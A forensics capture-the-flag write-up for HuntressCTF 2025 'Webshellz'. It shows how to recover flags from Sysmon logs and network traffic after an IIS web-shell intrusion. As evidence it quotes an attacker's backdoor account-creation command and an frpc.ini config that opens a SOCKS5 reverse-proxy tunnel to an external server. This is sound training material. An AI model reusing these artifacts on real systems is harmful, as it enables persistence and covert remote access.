---
title: HuntressCTF 2025 Webshellz
draft: false
tags:
  - ctf
  - deobfuscation
  - forensics
---

# Webshellz

> The sysadmin reported that some unexpected files were being uploaded to the file system of their IIS servers. As a security analyst, you have been tasked with reviewing the Sysmon, HTTP, and network traffic logs to help us identify the flags!

I first wanted to check for low hanging fruit using a quick recursive grep:
- `grep -arin "flag" .` -> nothing
- `grep -arin "Zxmh" .` -> find one (base64 encoding of flag).

From there, we had two flags left. One relating to a created user, and one relating to the suspicious binary. So, we can narrow our search down. The user is probably in the Sysmon.evtx, so let's dump it: `evtx_dump.py Sysmon.evtx > dumped.xml`. From there, we can scroll through (or use some searches like `user`), and eventually:

```xml
<Data Name="CommandLine">net  user IIS_USER VJGSuERc6qYAYPdRc556JTHqxqWwLbPwzABc0XgIhgwYEWdQji1 /add</Data>
```

We can decode this as base62 to get our second flag. Lastly, we need to figure out the suspicious binary. The packets are a bit fragmented around, but I was able to find the whole binary in packet 19354 as part of the multipart file upload as `frpc.exe`. I used `tshark` to download it: `tshark -r Traffic.pcapng -Y "frame.number==19354" -T fields -e http.file_data | xxd -r -p > out.exe` and then used a hex editor to remove the HTTP multipart header and trailer to get just the raw binary. To figure out if this is what we need to focus on, I uploaded the MD5 hash to VirusTotal, and it's been scanned previously (2 months ago!) which indicates to me that it's not related to the challenge (as in, no reversing needed). It turns out that it's https://github.com/fatedier/frp. If we go back to our Sysmon logs though, and search for `frpc.exe`, we find

```xml
<Data Name="CommandLine">frpc.exe  -c frpc.ini</Data>
```

So, it's using this reverse proxy with the `frpc.ini` configuration. If we search for this in wireshark, we will find the HTTP multipart upload which contains the final base32 encoded flag. 

```bash
Content-Disposition: form-data; name="Bin_Lable_File"; filename="frpc.ini" Content-Type: application/octet-stream 

[common] 
server_addr = 117.72.105.10
server_port = 7000
# MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===
[sock5]
type = tcp
plugin = socks5
remote_port = 6000
```